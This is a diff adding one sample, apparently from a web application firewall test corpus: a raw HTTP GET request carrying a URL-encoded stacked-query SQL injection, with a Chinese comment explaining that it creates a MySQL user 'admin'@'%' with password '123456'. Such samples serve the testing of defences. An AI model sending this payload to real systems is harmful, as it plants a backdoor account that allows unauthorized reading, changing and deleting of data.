@@ -1,0 +1,9 @@
+# SQL注入_GET_mysql_普通注入-06506228
+# 攻击者基于堆叠查询，将"create user"语句注入到原始SQL语句结尾，目的是在数据库中创建一个名为'admin'@'%'的用户，并使用密码'123456'进行身份验证。通过成功执行该SQL注入攻击，攻击者可以在数据库中创建一个具有管理员权限的用户。该用户可能具有与现有管理员相同的权限，这使得攻击者能够获取对数据库的完全访问权限。攻击者可以利用该权限执行未经授权的操作，包括读取、修改和删除数据，进一步危害整个数据库系统的安全性。
+GET /?id=1%3Bcreate%20user%20%27admin%27@%27%25%27%20identified%20by%20%27123456%27%20&bid=hd_tag_m8mv24fa HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv24fa
+RM-PRO-Token: 79145f5ac220bf925d33aca33812b6b2
+RM-PRO-Time: 1742808379375
+User-Agent: curl/7.83.1
+
